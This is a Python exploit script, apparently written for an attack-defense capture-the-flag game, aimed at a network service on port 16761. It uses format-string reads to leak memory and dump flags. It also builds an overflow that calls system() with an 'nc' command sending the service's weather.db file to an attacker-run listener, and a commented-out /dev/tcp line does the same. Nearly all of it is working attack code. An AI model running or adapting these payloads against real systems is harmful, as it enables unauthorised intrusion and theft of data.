#!/usr/bin/env python3

import sys
import socket
import struct
import string
import random
import fcntl

CPORT = 16761

def exploit(data, target, port, do_receive = True):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((target, port))

	s.sendall(data)

	response = None
	if do_receive:
		response = s.recv(1024 * 10)

	s.close()

	return response

def build_request(target, data):
	head = b"/ "
	request = head + (1024 - len(head)) * b'a' + data + b'\x00'

	return request

def crash(target):
	request = build_request(target, b'fuck' + b'%08x ' * 57 + b'%s')

	response = exploit(request, target, CPORT, False)

def get_clear_addr(target):
	request = build_request(target,  b'%08x ' * 2)

	response = exploit(request, target, CPORT)

	addr = (int(response.split(b' ')[1], 16) & 0xffffff00) | 0x60
	#addr = int(response.split(b' ')[1], 16)

	return addr

def hack_tpl_last(target):
	
	clear_addr = get_clear_addr(target)

	last_vals_addr_base = clear_addr + (0x7708 - 0x3060)

	for i in range(6):
		last_vals_addr = struct.pack("I", last_vals_addr_base + 4 * i)

		request = build_request(target, last_vals_addr + b'%08x ' * 57 + b'%s')

		response = exploit(request, target, CPORT)

		flag_addr = response[517:521]

		if len(flag_addr) != 4:
			continue

		request = build_request(target, flag_addr + b'%08x ' * 57 + b'%s')

		response = exploit(request, target, CPORT)

		print(response[517:].decode('ascii'))

	crash(target)

def hack_tpl_all(target):

	clear_addr = get_clear_addr(target)

	root_addr = clear_addr + (0x76a0 - 0x3060)

	queue = []

	for i in range(26):

		addr = root_addr + i * 4

		if addr & 0xff == 0:
			continue

		request = build_request(target, struct.pack("I", addr) + b'%08x ' * 57 + b'%s')

		addr = exploit(request, target, CPORT)[517:521]

		if (len(addr) < 4):
			continue

		queue.append((struct.unpack("I", addr)[0], 1, i))

	level = 1
	count = len(queue)

	while queue:
		item, queue = queue[0], queue[1:]

		for i in range(26):

			if item[1] > level:
				level = item[1]
				count = 0
				print(level)

			if count > 100:
				break

			addr = item[0] + i * 4

			if addr & 0xff == 0:
				continue

			addr_str = struct.pack("I", addr)

			if b'%' in addr_str:
				continue

			request = build_request(target, addr_str + b'%08x ' * 57 + b'%s')

			value = exploit(request, target, CPORT)

			if item[1] == 12:
				print(value[517:].decode('ascii'))
				break

			addr = value[517:521]

			if (len(addr) < 4):
				continue

			val = struct.unpack("I", addr)[0]

			queue.append((val, item[1] + 1, i))
			count += 1

def fucktorize(n):
	q = int(n)
	acc = 0
	l = []
	while True:
		for i in range(2, 10):
			while q % i == 0:
				if acc > 0:
					l.append(('+', acc))
					acc = 0
				q /= i
				l.append(('*', i))
		if q == 1:
			break
		q -= 1
		acc += 1
	return list(reversed(l))


def hack_rop(target):
	ip = socket.inet_ntoa(fcntl.ioctl(socket.socket(socket.AF_INET, socket.SOCK_STREAM), 0x8915, struct.pack('256s', b'game'))[20:24])

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind((ip, 16790))
	s.listen(10)

	#data = b'echo fuck > $(printf \\\\057)dev$(printf \\\\057)tcp$(printf \\\\057)' + ip.encode('ascii') + b'$(printf \\\\057)16790; /'
	data = b'nc ' + ip.encode('ascii') + b' 16790 < weather.db; /'
	print(data)
	#data = b'cat weather.db>42; exit; /'

	clear_addr = get_clear_addr(target)

	system_addr = clear_addr + (0x2d4d - 0x3060)
	data_addr = clear_addr + (0x62a0 - 0x3060)

	actions2 = fucktorize(data_addr)
	actions1 = fucktorize(system_addr - len(actions2))

	for e in actions1:
		if e[0] == '+':
			c = bytes((0x100 - e[1], ))
		else:
			c = bytes((e[1], ))

		data += b'a' * 13 + c + b'b\x08' + b'a' * 16 # large value to make zero in second register

	data += b'a' * 13 + b'\xffb\xff' + c + b'a' * 16

	for e in actions2:
		if e[0] == '+':
			c = bytes((0x100 - e[1], ))
		else:
			c = bytes((e[1], ))

		data += b'a' * 13 + b'\xffb' + c + b'a' * 16

	data += b' '

	exploit(data, target, CPORT, False)
	
	conn, addr = s.accept()
	data = conn.recv(1024 * 1024 * 15)
	conn.close()

	print(data.decode('ascii', 'ignore'))


methods = [hack_tpl_last, hack_tpl_all, hack_rop]

method, target = sys.argv[1:]

methods[int(method)](target)